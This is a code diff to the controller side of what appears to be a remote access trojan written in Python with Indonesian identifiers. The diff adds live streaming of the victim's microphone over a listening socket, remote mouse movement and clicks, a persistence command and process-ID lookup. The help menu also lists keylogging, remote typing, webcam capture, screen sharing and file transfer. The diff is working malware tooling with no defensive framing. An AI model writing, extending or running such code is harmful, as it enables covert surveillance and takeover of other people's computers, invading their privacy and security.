@@ -14,6 +14,7 @@ import time
 from fileattacker import download_file, upload_file
 from termcolor import cprint
 import numpy as np
+import sys
 
 def main_con():
     soc = None
@@ -44,13 +45,42 @@ def main_con():
 
 main_log = threading.Event()
 
-def cd(_target):
+def send_format(sok, format):
+    try:
+        format = f"{format.strip()}\n"
+        sok.sendall(format.encode())
+    except:
+        return
+
+def wrap_move_cursor(sok, command: str):
+    command = command.strip()
+
+    if command == "click":
+        send_format(sok, "click")
+        return
+
+    if command.startswith("move"):
+        raw_coor = command[4:].strip()
+    else:
+        raw_coor = command
+
+    if "," not in raw_coor:
+        cprint("[!] Use , to separate x and y coordinate (x,y)", 'yellow')
+        send_format(sok, "invalid")
+    else:
+        try:
+            x, y = raw_coor.split(",")
+            send_format(sok, f"{x.strip()},{y.strip()}")
+        except:
+            send_format(sok, "invalid")
+                
+def recv_status(_target):
     try:
         _target.settimeout(5.0)
         print(_target.recv(1024).decode())
         _target.settimeout(None)
     except:
-        cprint("[!] Can't receive the canged directory name", 'yellow')
+        cprint("[!] Can't recv status", 'yellow')
 
 def start_log():
     cprint("[*] Starting logger", 'blue')
@@ -265,6 +295,41 @@ def konversi_byte_stream():
     except:
         cprint("[-] Can't access camera", 'red')
 
+def do_streaming_audio():
+    p = pyaudio.PyAudio()
+
+    stream = p.open(format=FORMAT,
+                    channels=CHANNELS,
+                    rate=RATE,
+                    output=True,
+                    frames_per_buffer=CHUNK)
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(('0.0.0.0', 781))
+    sock.listen(1)
+
+    cprint("[*] Connecting", 'blue')
+
+    conn, addr = sock.accept()
+    cprint(f"[+] Connected {addr}", 'green')
+
+    try:
+        cprint("[+] Streaming audio... (Press ctrl+c to quit)", 'green')
+        while True:
+            data = conn.recv(CHUNK*2)
+            if not data:
+                break
+
+            stream.write(data)
+    except KeyboardInterrupt:
+        cprint("[!] Stopping audio streaming...", 'yellow')
+    finally:
+        conn.close()
+        sock.close()
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+
 def data_diterima(_target):
         data = ''
         while True:
@@ -297,7 +362,7 @@ def shellc(_target):
             elif perintah == 'clear':
                 os.system('cls')
             elif perintah[:3] == 'cd ':
-                cd(_target)
+                recv_status(_target)
             elif perintah[:8] == 'download':
                 download_file(_target, perintah[9:])
             elif perintah[:6] == 'upload':
@@ -316,6 +381,9 @@ def shellc(_target):
                 download_file(_target,"ss"+str(n)+".png")
             elif perintah == 'screen_share':
                 screen_record(host='0.0.0.0', port=9991) 
+            elif perintah[:11] == 'persistence':
+                cprint("new file has been started, run this handler again if you want to continue")
+                sys.exit()
             elif perintah == 'help':
                 cprint("""
                         basic command:
@@ -363,11 +431,18 @@ def shellc(_target):
                     example:    persistence winsec manager.exe
                     =================================
 
-                        mic, keys command:
+                        mic, keys, and cursor command:
                     ================================
-                    -rec_audio >> record audio for 20 second
+                    -audio:
+                      -rec_audio >> record audio for 20 sec and save it in disk
+                      -live_audio >> stream audio without saving it
                     
                     -send_key  >> type keyboard remotely
+
+                    -cursor:
+                      -move x,y >> move cursor to specific coordinate
+                      -rclick   >> do right click
+                      -lclick   >> do left click
                     ================================ 
 
                         execution:
@@ -377,11 +452,15 @@ def shellc(_target):
                     -kill       >> kill program by image name
                       
                     -pidkill    >> kill program by pid name
+
+                    -getpid     >> get pid name
                     ================================
                     """, 'yellow')
             elif perintah == 'rec_audio':
                 p += 1
                 receive_and_save('retrieved_audio'+str(p)+'.wav')
+            elif perintah == 'live_audio':
+                do_streaming_audio()
             elif perintah == 'send_key':
                 keystroke()   
             elif perintah == 'snap_cam':
@@ -393,6 +472,14 @@ def shellc(_target):
                 pass  
             elif perintah[:7] == 'pidkill':
                 pass
+            elif perintah.startswith("move"):
+                wrap_move_cursor(_target, perintah)
+            elif perintah.strip() == "rclick":
+                send_format(_target, "rclick")
+            elif perintah.strip() == "lclick":
+                send_format(_target, "lclick")
+            elif perintah == "getpid":
+                recv_status(_target)
             else:
                 hasil = data_diterima(_target)
                 print(hasil)
